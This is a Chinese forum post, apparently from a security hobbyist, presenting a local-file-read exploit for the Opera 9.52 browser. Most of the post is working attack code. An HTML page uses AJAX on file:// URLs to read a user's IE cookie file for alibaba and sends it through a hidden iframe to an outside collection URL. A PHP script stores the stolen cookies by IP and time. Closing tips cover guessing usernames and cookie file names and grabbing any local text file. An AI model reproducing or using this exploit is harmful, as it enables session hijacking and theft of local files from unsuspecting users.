@@ -1,0 +1,156 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+opera 9.52使用ajax读取本地文件漏洞
+D8888D主贴内容-------------------------------------------------------
+by 空虚浪子心
+
+这也可能是一个安全特性吧，opera可以使用ajax读取本地文件。
+
+ff3没有这个漏洞。
+
+不废话，看代码吧。
+
+利用方式如下：
+
+这段代码保存为本地htm文件，然后使用opera打开。
+
+将会把本地用户名为administrator在alibaba的cookie，发送到[url=http://www.inbreak.net/kxlzxtest/testxss/a.php]链接标记http://www.inbreak.net/kxlzxtest/testxss/a.php[/url]
+
+
+
+a.htm 代码 <iframe id="framekxlzx" width=0 height=0></iframe>   
+
+<script>   
+
+var xmlHttp;   
+
+function createXMLHttp(){   
+
+    if(window.XMLHttpRequest){   
+
+        xmlHttp = new XMLHttpRequest();           
+
+    }   
+
+    else if(window.ActiveXObject){   
+
+        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");   
+
+    }   
+
+}   
+
+   
+
+function startRequest(doUrl){   
+
+           
+
+    createXMLHttp();   
+
+       
+
+    xmlHttp.onreadystatechange = handleStateChange;   
+
+       
+
+    xmlHttp.open("GET", doUrl, true);   
+
+       
+
+    xmlHttp.send(null);   
+
+       
+
+       
+
+}    
+
+   
+
+function handleStateChange(){   
+
+    if (xmlHttp.readyState == 4 ){   
+
+            var strResponse = "";   
+
+            setTimeout("framekxlzxPost(xmlHttp.responseText)", 1000);    
+
+               
+
+    }   
+
+}   
+
+   
+
+function doMyAjax(user,file)   
+
+{   
+
+        var time = Math.random();   
+
+           
+
+        var strPer = 'file://localhost/C:/Documents%20and%20Settings/'+user+'/Cookies/'+file+'?time='+time;   
+
+           
+
+        startRequest(strPer);   
+
+       
+
+}   
+
+   
+
+function framekxlzxPost(text)   
+
+{   
+
+    document.getElementById('framekxlzx').src="http://www.inbreak.net/kxlzxtest/testxss/a.php?cookie="+escape(text);   
+
+    alert(/ok/);   
+
+}   
+
+   
+
+doMyAjax('administrator','administrator@alibaba[1].txt');   
+
+   
+
+</script>   
+复制代码a.php代码：
+
+a.php 代码 <?php       
+
+    
+
+$user_IP = ($_SERVER["HTTP_VIA"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];   
+
+$user_IP = ($user_IP) ? $user_IP : $_SERVER["REMOTE_ADDR"];    
+
+   
+
+$fp = fopen($user_IP.date("Y-m-d H:i:s")."cookie.txt","wb");      
+
+fwrite($fp,$_GET["cookie"]);       
+
+fclose($fp);     
+
+?>      
+复制代码a.php会按照   IP+时间+cookie.txt 格式生成一个txt文件。
+
+例如：121.0.29.2252009-01-05 11:55:02cookie.txt
+
+里面保存着administrator@alibaba[1].txt的内容。
+
+几点说明：
+1，cookie文件是IE的，比较XX，但是有很多人都会IE和opera混用。
+2，必须预测本地用户名，不过很多人都是administrator。
+3，必须预测cookie文件名。这个可以取一些常用网站的，反正ajax是异步，你可以同时调用几个方法。
+4，或者你可以发送任何本地TXT文件。
+
+opera可能说这是特性？不知道了，反正FF3没这个漏洞，使用这种方式会报错访问拒绝。
